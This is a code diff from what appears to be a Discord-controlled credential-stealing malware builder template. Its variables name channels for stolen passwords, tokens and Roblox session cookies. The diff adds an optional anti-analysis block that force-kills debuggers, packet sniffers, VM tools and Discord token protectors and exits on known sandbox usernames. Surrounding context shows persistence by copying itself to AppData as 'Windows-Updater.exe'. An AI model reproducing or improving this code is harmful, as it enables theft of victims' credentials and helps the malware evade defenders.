@@ -11,11 +11,12 @@ client.remove_command("help")
 
 token = "{token}"
 guild_id = "{guild_id}"
-annc_channel_id = "{announc}"
-pass_channel_id = "{passw}"
-tokens_channel_id = "{tokens}"
-roblosecurity_channel_id = "{roblosec}"
-autostart = True
+autostart = "{autostart}"
+antivm = "{antivm}"
+annc_channel_id = "{announcements}"
+pass_channel_id = annc_channel_id
+tokens_channel_id = annc_channel_id
+roblosecurity_channel_id = annc_channel_id
 
 ### CODE
 
@@ -966,6 +967,31 @@ def mainfunc():
     bluser = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')
     bltask = ('vm3dservice', 'fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector', 'processhacker')
 
+    if antivm != False:
+        result = subprocess.getoutput("tasklist")
+        numb = len(result)
+        if numb > 0:
+            temp = (os.getenv('TEMP'))
+            if os.path.isfile(temp + r"\olist.txt"):
+                os.system(r"del %temp%\olist.txt /f")
+            f1 = open(temp + r"\olist.txt", 'a')
+            f1.write(result)
+            f1.close()
+            final = ""
+            with open(f"{os.getenv('TEMP')}\olist.txt") as A:
+                final = A.read().lower()
+            for task in bltask:
+                if task in final:
+                    try:
+                        kilproc = r"taskkill /IM" + ' "' + task + '.exe' + '" ' + r"/f" 
+                        os.system(kilproc)
+                    except: sys.exit(0)
+
+        os.remove(f"{temp}\olist.txt")
+
+        if f"{os.getlogin()}".lower() in bluser:
+            sys.exit(0)
+
     if autostart != False:
         if sys.argv[0].endswith("exe"):
             backdoor_location = os.environ["appdata"] + "\\Microsoft\\Windows-Updater.exe"
@@ -981,29 +1007,7 @@ def mainfunc():
                 t = p.read()
                 p.close()
     
-    result = subprocess.getoutput("tasklist")
-    numb = len(result)
-    if numb > 0:
-        temp = (os.getenv('TEMP'))
-        if os.path.isfile(temp + r"\olist.txt"):
-            os.system(r"del %temp%\olist.txt /f")
-        f1 = open(temp + r"\olist.txt", 'a')
-        f1.write(result)
-        f1.close()
-        final = ""
-        with open(f"{os.getenv('TEMP')}\olist.txt") as A:
-            final = A.read().lower()
-        for task in bltask:
-            if task in final:
-                try:
-                    kilproc = r"taskkill /IM" + ' "' + task + '.exe' + '" ' + r"/f" 
-                    os.system(kilproc)
-                except: sys.exit(0)
-
-    os.remove(f"{temp}\olist.txt")
-
-    if f"{os.getlogin()}".lower() in bluser:
-        sys.exit(0)
+    
 
 if __name__ == '__main__':
     mainfunc()
